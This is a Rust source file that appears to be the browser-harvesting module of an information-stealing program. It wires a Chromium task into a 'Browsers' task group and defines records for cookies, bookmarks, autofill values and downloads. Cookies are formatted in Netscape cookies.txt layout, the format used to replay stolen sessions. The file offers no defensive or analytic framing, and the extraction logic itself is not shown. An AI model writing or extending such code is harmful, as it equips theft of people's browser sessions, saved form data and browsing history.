#![no_std]

mod chromium;

use alloc::string::String;
use crate::alloc::borrow::ToOwned;
extern crate alloc;

use alloc::vec;
use core::fmt::{write, Display, Formatter};
use tasks::Task;
use tasks::{composite_task, impl_composite_task_runner, CompositeTask};
use crate::chromium::ChromiumTask;

pub struct BrowsersTask {
    inner: CompositeTask
}

impl BrowsersTask {
    pub fn new() -> Self {
        Self {
            inner: composite_task!(
                ChromiumTask::new()
            )
        }
    }
}

impl_composite_task_runner!(BrowsersTask, "Browsers");

#[derive(PartialEq, Ord, Eq, PartialOrd)]
pub(crate) struct Cookie {
    pub host_key: String,
    pub name: String,
    pub value: String,
    pub path: String,
    pub expires_utc: i64
}

impl Display for Cookie {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(
            f, 
           "{}\tTRUE\t{}\tFALSE\t{}\t{}\t{}\r", 
           self.host_key, self.path, self.expires_utc, self.name, self.value
        )
    }
}

#[derive(PartialEq, Ord, Eq, PartialOrd)]
pub(crate) struct Bookmark {
    pub name: String,
    pub url: String,
}

impl Display for Bookmark {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(
            f,
            "Name: {}\n\
            Url: {}",
            self.name, self.url
        )
    }
}

#[derive(PartialEq, Ord, Eq, PartialOrd)]
pub(crate) struct AutoFill {
    pub name: String,
    pub value: String,
    pub last_used: i64
}

impl Display for AutoFill {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(
            f,
            "Name: {}\n\
            Value: {}",
            self.name, self.value
        )
    }
}

#[derive(PartialEq, Ord, Eq, PartialOrd)]
pub(crate) struct Download {
    pub saved_as: String,
    pub url: String
}

impl Display for Download {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(
            f,
            "Url: {}\n\
            Saved: {}",
            self.url, self.saved_as
        )
    }
}